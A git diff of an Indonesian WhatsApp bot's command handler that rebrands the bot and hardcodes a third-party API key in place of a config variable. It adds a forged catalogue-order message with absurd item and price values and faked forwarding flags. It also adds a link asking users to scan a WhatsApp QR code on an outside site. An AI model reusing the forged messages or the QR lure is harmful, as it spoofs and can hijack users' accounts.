12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
+"itemCount": 2021,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"orderTitle": "LOL",
+"message":"Hallo Kak",
+"sellerJid": "6288224859350@s.whatsapp.net",
+"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
+"totalAmount1000": "99999999999999999999",
+"totalCurrencyCode": "IDR",
+"contextInfo": {
+"forwardingScore": 3,
+"isForwarded": true
+}
+}
+}, {quoted:imeu, contextInfo:{}}) 
+
+dha.relayWAMessage(res)
+break     
+//------------------<HEWAN MENU>---------------
+                    
+//------------------< Ingfo Bot >-------------------
       case 'runtime':
               textImg(`${runtime(process.uptime())}`)
               break
        case 'youtube': 
-              reply(`Jangan Lupa Subscribe YT Owner:\n https://youtube.com/c/PINOMODZ`)
+              reply(`Jangan Lupa Subscribe YT Owner:\n https://youtube.com/PINOMODZ`)
               break
-       				    //------------------< Shop Bot >-------------------
        case 'masukandata':
-             reply(`*「${ownerName}」*
+             reply(`*「NIZAM STORE」*
 ━━━━━━━━━━━━━━━━━━━━
 FORMAT ORDER 
 
@@ -3786,14 +3668,14 @@ Proses _1-15 menit_
 case 'pubg':
              reply(`*PUBGM PAKET (B)*
 (10-120 Menit) 
-16  💵   Rp 4.000
-26  💵   Rp 6.050
-52  💵   Rp 9.950
-105 💵 Rp 20.500
-131 💵  Rp 23.500
-263 💵  Rp 47,000
+16 💵      Rp 4.000
+26 💵      Rp 6.050
+52 💵      Rp 9.950
+105 💵  Rp 20.500
+131 💵   Rp 23.500
+263 💵   Rp 47,000
 530 💵  Rp 91,000
-825 💵  Rp 139,000
+825 💵   Rp 139,000
 1100 💵 Rp 182,000
 1925 💵 Rp 316,000
 2200 💵 Rp 361,000
@@ -3802,6 +3684,9 @@ case 'pubg':
 4125 💵 Rp 672,000
 *_JIKA MINAT KETIK ${prefix}masukandata_*`)
               break
+           case 'jadibot':
+      reply(` Gak Bisa Jadi Bot?, Nih Tinggal Scan Qr Di Link Bawah\nhttps://my-bots-waa.herokuapp.com/`)
+      break
       case 'ping':
       case 'speed':
               timestampe = speed();
@@ -3809,7 +3694,6 @@ case 'pubg':
               reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
               break
       case 'botstat':
-      case 'status':
               groups = dha.chats.array.filter(v => v.jid.endsWith('g.us'))
               privat = dha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
               ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
@@ -3881,7 +3765,7 @@ case 'tupai':
 						fs.unlinkSync(media)
 						if (err) return reply('Error!')
 						hah = fs.readFileSync(ran)
-						dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftext})
+						dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: troli})
 						fs.unlinkSync(ran)
 					})
 				break 
@@ -3895,7 +3779,7 @@ case 'addstik':
 				setiker.push(`${svst}`)
 				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
 				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
-				dha.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: ftext})
+				dha.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: troli})
 				break
 case 'addimg':
 				if (!isOwner) return reply (mess.only.owner)
@@ -3907,7 +3791,7 @@ case 'addimg':
 				imagenye.push(`${svst}`)
 				fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
 				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
-				dha.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: ftext})
+				dha.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: troli})
 				break
 				
 case 'addvid':
@@ -3920,7 +3804,7 @@ case 'addvid':
 				imagenye.push(`${svst}`)
 				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
 				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
-				dha.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: ftext })
+				dha.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: troli })
 				break
 			        
 case 'addvn':
@@ -3933,7 +3817,7 @@ case 'addvn':
 				audionye.push(`${svst}`)
 				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
 				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
-				dha.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: ftext})
+				dha.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: troli})
 				break 
 case 'liststik':
 				teks = '*Sticker list :*\n\n'
@@ -3941,7 +3825,7 @@ case 'liststik':
 					teks += `- ${awokwkwk}\n`
 				}
 				teks += `\n*Total : ${setiker.length}*`
-				dha.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": setiker } })
+				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
 				break				
 case 'listimg':
 				teks = '*Image list :*\n\n'
@@ -3949,7 +3833,7 @@ case 'listimg':
 					teks += `- ${awokwkwk}\n`
 				}
 				teks += `\n*Total : ${imagenye.length}*`
-				dha.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": setiker } })
+				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
 				break				
 case 'listvid':
 				teks = '*List Video :*\n\n'
@@ -3957,7 +3841,7 @@ case 'listvid':
 					teks += `- ${awokwkwk}\n`
 				}
 				teks += `\n*Total : ${videonye.length}* `
-				dha.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": imagenye } })
+				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": imagenye } })
 				break				
 case 'listvn':
 				teks = '*List Vn:*\n\n'
@@ -3965,13 +3849,13 @@ case 'listvn':
 					teks += `- ${awokwkwk}\n`
 				}
 				teks += `\n*Total : ${audionye.length}*`
-				dha.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": audionye } })
+				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": audionye } })
 				break	
 case 'getstik':
 				namastc = body.slice(9)
 				try {
 				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
-				dha.sendMessage(from, result, sticker,{quoted:ftoko})
+				dha.sendMessage(from, result, sticker,{quoted:troli})
 				} catch {
 				  reply('Pack tidak terdaftar')
 				}
@@ -3980,7 +3864,7 @@ case 'getimg':
 				namastc = body.slice(8)
 				try {
 				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
-				dha.sendMessage(from, buffer, image, { quoted: ftoko, caption: `Result From Database : ${namastc}.jpeg` })
+				dha.sendMessage(from, buffer, image, { quoted: troli, caption: `Result From Database : ${namastc}.jpeg` })
 				} catch {
 				  reply('Pack tidak terdaftar')
 				}
@@ -3990,7 +3874,7 @@ case 'getvid':
 				namastc = body.slice(8)
 				try {
 				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
-				dha.sendMessage(from, buffer, video, { quoted: ftoko, caption: `Result From Database : ${namastc}.mp4` })
+				dha.sendMessage(from, buffer, video, { quoted: troli, caption: `Result From Database : ${namastc}.mp4` })
 				} catch {
 				  reply('Pack tidak terdaftar')
 				}
@@ -3999,7 +3883,7 @@ case 'getvn':
 				namastc = body.slice(7)
 				try {
 				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
-				dha.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: ftoko, ptt: true })
+				dha.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: troli, ptt: true })
 				} catch {
 				  reply('Pack tidak terdaftar')
 				}
@@ -4023,7 +3907,6 @@ case 'getvn':
 }
              break
       case 'getquoted':
-      case 'getcaption':
              reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
              break
       case 'bc':
@@ -4040,7 +3923,7 @@ case 'getvn':
              reply('Suksess broadcast')
              } else {
              for (let _ of anu) {
-             sendMess(_.jid, `*「 PESAN SIARAN ${botName}」*\n\n${body.slice(4)}`)
+             sendMess(_.jid, `*「 PESAN SIARAN PSYCOBOTZ」*\n\n${body.slice(4)}`)
 }
              reply('Suksess broadcast')
 }
@@ -4340,9 +4223,6 @@ case 'linkgc':
               reply (toxic)
 })
               break
-              
-              
-              
         case 'citacita':
               const cita =['https://api-psycobotz.000webhostapp.com/citacita/citacita1.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita2.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita3.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita4.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita5.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita6.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita7.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita8.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita9.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita10.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita11.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita12.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita13.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita14.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita15.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita16.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita17.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita18.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita19.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita20.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita21.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita22.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita23.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita24.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita25.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita26.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita27.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita28.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita29.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita30.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita31.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita32.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita33.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita34.mp3','https://api-psycobotz.000webhostapp.com/citacita/citacita35.mp3']
               const cita3 = cita[Math.floor(Math.random() * cita.length)]
@@ -4575,14 +4455,13 @@ case 'caripesan':  //by ANU TEAM
               if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 
               anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${q}`)
               teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://api.lolhuman.xyz/`
-              dha.sendMessage(from, teks, text, {quoted: ftoko})
+              dha.sendMessage(from, teks, text, {quoted: troli})
               break
        case 'bugreport':
-       case 'lapor':
               if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
               teks = args.join(' ')
               reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
-              dha.sendMessage('6285643260438@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
+              dha.sendMessage('62856432604381@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
               break
        case 'readall':
               totalchat.map( async ({ jid }) => {
@@ -4597,7 +4476,7 @@ case 'caripesan':  //by ANU TEAM
 case 'kisahnabi':
                 if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                     query = args.join(" ")
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolkey}`)
+                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=najisbaperanRw`)
                     get_result = get_result.result
                     ini_txt = `Name : ${get_result.name}\n`
                     ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
@@ -4609,7 +4488,7 @@ case 'kisahnabi':
 case 'jadwalsholat':
                     if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                     daerah = args.join(" ")
-get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolkey}`)
+get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=najisbaperanRw`)
                     get_result = get_result.result
                     ini_txt = `Wilayah : ${get_result.wilayah}\n`
                     ini_txt += `Tanggal : ${get_result.tanggal}\n`
@@ -4625,7 +4504,7 @@ get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apike
                     reply(ini_txt)
                     break  
              case 'listsurah':
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${lolkey}`)
+                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=najisbaperanRw`)
                     get_result = get_result.result
                     ini_txt = 'List Surah:\n'
                     for (var x in get_result) {
@@ -4635,7 +4514,7 @@ get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apike
                     break                                              
 case 'alquran':
                     if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
-                    urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${lolkey}`
+                    urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=najisbaperanRw`
                     quran = await fetchJson(urls)
                     result = quran.result
                     ayat = result.ayat
@@ -4653,7 +4532,7 @@ case 'alquran':
                     reply(ini_txt)
                     break
 case 'asmaulhusna':
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
+                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=najisbaperanRw`)
                     get_result = get_result.result
                     ini_txt = `No : ${get_result.index}\n`
                     ini_txt += `Latin: ${get_result.latin}\n`
@@ -4665,46 +4544,19 @@ case 'asmaulhusna':
  case 'alquranaudio':
                     if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                     surah = args[0]
-                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolkey}`)
+                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=najisbaperanRw`)
                     dha.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })      
                     break                                         
-//------------------< serti menu by psycobotz >-------------------   
-case 'tololserti': 				
-				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti ${pushname}`)
+//------------------< serti menu >-------------------   
+case 'sertitolol': 				
+				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti KURR GAMTENG`)
 				ct = body.slice(12)
-				zhain = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${lolkey}&name=${ct}`)
-				dha.sendMessage(from, zhain, image, { quoted: freply, caption: 'Nih Dah Jadi' })
-				break
-case 'fuckboyserti': 				
-				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fuckboyserti ${pushname}`)
-				pino = args.join(' ')
-				psyco = await getBuffer(`https://api.lolhuman.xyz/api/fuckboy?apikey=${lolkey}&name=${pino}`)
-				dha.sendMessage(from, psyco, image, { quoted: freply, caption: 'Nih Dah Jadi' })
-				break
-case 'fuckgirlserti': 				
-				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fuckgirlserti ${pushname}`)
-				nizam = args.join(' ')
-				store = await getBuffer(`https://api.lolhuman.xyz/api/fuckgirl?apikey=${lolkey}&name=${nizam}`)
-				dha.sendMessage(from, store, image, { quoted: freply, caption: 'Nih Dah Jadi' })
-				break
-case 'bucinserti': 				
-				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}bucinserti ${pushname}`)
-				ngentod = args.join(' ')
-				lo = await getBuffer(`https://api.lolhuman.xyz/api/bucinserti?apikey=${lolkey}&name=${ngentod}`)
-				dha.sendMessage(from, lo, image, { quoted: freply, caption: 'Nih Dah Jadi' })
-				break
-
-case 'pacarserti': 				
-				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}|${ownerName}`)
-				ct = args.join(' ')
-				dap1 = ct.split('|')[0]
-				dap2 = ct.split('|')[1]
-				psyco = await getBuffer(`https://api.lolhuman.xyz/api/pacarserti?apikey=${lolkey}&name1=${dap1}&name2=${dap2}`)
-				dha.sendMessage(from, psyco, image, { quoted: freply, caption: 'Nih Dah Jadi' })
+				zhain = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=najisbaperanRw&name=${ct}`)
+				dha.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
 				break
 //------------------< cerita menu >-------------------
 case 'cerpen':
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
+                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=najisbaperanRw`)
                     get_result = get_result.result
                     ini_txt = `Title : ${get_result.title}\n`
                     ini_txt += `Creator : ${get_result.creator}\n`
@@ -4713,7 +4565,7 @@ case 'cerpen':
                     break
 case 'ceritahoror':
 case 'horor':
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
+                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=najisbaperanRw`)
                     get_result = get_result.result
                     ini_txt = `Title : ${get_result.title}\n`
                     ini_txt += `Desc : ${get_result.desc}\n`
@@ -4723,14 +4575,14 @@ case 'horor':
                      break 
 //------------------(KATA KATA MENU)---------+--------
      case 'quotes':
-                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
+                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=najisbaperanRw`)
                     quotes = quotes.result
                     author = quotes.by
                     quotes = quotes.quote
                     reply(`_${quotes}_\n\n*― ${author}*`)
                     break
                 case 'quotesanime':
-                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
+                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=najisbaperanRw`)
                     quotes = quotes.result
                     quote = quotes.quote
                     char = quotes.character
@@ -4738,11 +4590,11 @@ case 'horor':
                     episode = quotes.episode
                     reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                     break
-                case 'faktaunik':
+               case 'faktaunik':
                 case 'katabijak':
                 case 'pantun':
                 case 'bucin':
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
+                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=najisbaperanRw`)
                     reply(get_result.result)
                     break                                         
 //------------------< Maker Menu >--------------------   
@@ -4750,35 +4602,35 @@ case 'tahta':
          if (args.length == 0) return reply(`Usage: ${prefix} + command} text\nExample: ${prefix + command} DHA`) 
          teks = args.join(" ") 
          reply('SABAR YA SAYANG....') 
-         buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${lolkey}&text=${teks}`) 
+         buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=najisbaperanRw&text=${teks}`) 
          dha.sendMessage(from, buffer, image, {quoted: ftoko, caption : 'ini hasilnya kak....'})
          break    
 case 'pornhub':
-         if (args.length == 0) return reply(`Contoh: ${prefix + command} ${botName}`)
+         if (args.length == 0) return reply(`Contoh: ${prefix + command} PSYCOBOTZ`)
          txt1 = args[0]
          txt2 = args[1]
-         ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
+         ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/pornhub?apikey=najisbaperanRw&text1=${txt1}&text2=${txt2}`)
         dha.sendMessage(from, ini_anu, image, {quoted: ftoko})
         break
 case 'cup':          
         if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
         ini_txt = args.join(" ")
-        getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
-        dha.sendMessage(from, gambar, image, { quoted: ftoko })
+        getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup?apikey=najisbaperanRw&text=${ini_txt}`).then((gambar) => {
+        dha.sendMessage(from, gambar, image, { quoted: troli })
                     })
                     break
 case 'coffe':          
         if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
         ini_txt = args.join(" ")
-        getBuffer(`https://api.lolhuman.xyz/api/photooxy1/coffe?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
-        dha.sendMessage(from, gambar, image, { quoted: ftoko, caption : 'jangan lupa bayar 15.000' })
+        getBuffer(`https://api.lolhuman.xyz/api/photooxy1/coffe?apikey=najisbaperanRw&text=${ini_txt}`).then((gambar) => {
+        dha.sendMessage(from, gambar, image, { quoted: troli, caption : 'jangan lupa bayar 15.000' })
                     })
                     break
                 case 'cup1':        
                     if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                     ini_txt = args.join(" ")
-                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup1?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
-                        dha.sendMessage(from, gambar, image, { quoted: ftoko })
+                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup1?apikey=najisbaperanRw&text=${ini_txt}`).then((gambar) => {
+                        dha.sendMessage(from, gambar, image, { quoted: troli })
                     })
                     break   
 
@@ -4814,7 +4666,7 @@ case 'coffe':
                 case 'freefire':
                     if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                     ini_txt = args.join(" ")
-                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
+                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=najisbaperanRw&text=${ini_txt}`).then((gambar) => {
                     dha.sendMessage(from, gambar, image, { quoted: ftoko })
                     })
                     break                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
@@ -4895,8 +4747,8 @@ case 'coffe':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                list = []
-               com = [`group buka`,`leveling enable`,`wel enable`,`antilink enable`,`mute enable`]
-               comm = [`group tutup`,`leveling disable`,`wel disable`,`antilink disable`,`mute disable`]
+               com = [`group buka`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]
+               comm = [`group tutup`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]
                listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]
                suruh = [`Enable`, `Disable`]
                fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]
@@ -4935,7 +4787,7 @@ case 'coffe':
 					break                            
 //------------------< Menunya Bang:v >-------------------
       case 'dana':
-             reply(`OVO : 085643260438\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
+             reply(`OVO : 088216185132\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
              break
            case 'gopay':
              reply(`GOPAY : https://telegra.ph/file/ffba186c9fd6f8c3e519f.jpg\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
@@ -4943,26 +4795,73 @@ case 'coffe':
          case 'pulsa':
              reply(`PULSA : 085643260438\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
              break              
-     
-       case 'infoig':
+      case 'infoig':
              reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/xnoob_ganz`)
              break
-      
       case 'grupbot':
              reply('https://chat.whatsapp.com/FJdtdDteQkkBSXkAl44sey')
              break
-      
       case 'grupdm':
-             reply('https://chat.whatsapp.com/FRpUpAwgnLS9UwAtjJYjeM')
+             reply('https://chat.whatsapp.com/LtaYL5HB2oY7SpkL1leNf6')
              break
-
+      case 'ownermenu':
+             dha.sendMessage(from, ownerMenu(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'downloadmenu':
+             dha.sendMessage(from, downloadMenu(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'gamemenu':
+             dha.sendMessage(from, gameMenu(prefix), MessageType.text, {quoted: troli})
+             break
       case 'rules':
-             dha.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: ftoko})
+             dha.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: troli})
+             break
+       case 'owner':
+             dha.sendMessage(from, owner(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'wibumenu':
+             dha.sendMessage(from, wibuMenu(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'infomenu':
+             dha.sendMessage(from, infoMenu(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'stickermenu':
+             dha.sendMessage(from, stickerMenu(prefix), MessageType.text, {quoted: troli})
+             break
+       case 'islammenu':
+             dha.sendMessage(from, islamMenu(prefix), MessageType.text, {quoted: troli})
+             break
+       case 'iklan':
+             dha.sendMessage(from, iklanBot(prefix), MessageType.text, {quoted: troli})
+             break
+       case 'ceritamenu':
+             dha.sendMessage(from, ceritaMenu(prefix), MessageType.text, {quoted: troli})
+             break  
+       case 'makermenu':
+             dha.sendMessage(from, makerMenu(prefix), MessageType.text, {quoted: troli})
+             break 
+     case 'toolsmenu':
+              dha.sendMessage(from,toolsMenu(prefix), MessageType.text, {quoted: troli})
+              break                   
+      case 'dewasamenu':
+             dha.sendMessage(from, dewasaMenu(prefix), MessageType.text, {quoted: troli})
+             break                                    
+      case 'othermenu':
+             dha.sendMessage(from, otherMenu(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'groupmenu': 
+      case 'grupmenu': 
+             dha.sendMessage(from, groupMenu(prefix), MessageType.text, {quoted: troli})
+             break
+      case 'funmenu':
+             dha.sendMessage(from, funMenu(prefix), MessageType.text, {quoted: troli})
              break
 
 default:
 
-/*if (budy.includes(`Assalamualaikum`)) {
+//ini sound PsycoBOTZ
+//kalo mau ambil kasih creatornya lah jancok
+if (budy.includes(`Assalamualaikum`)) {
                   const salam = fs.readFileSync('media/soundnya/WaalaikumsalamSayang.ogg')
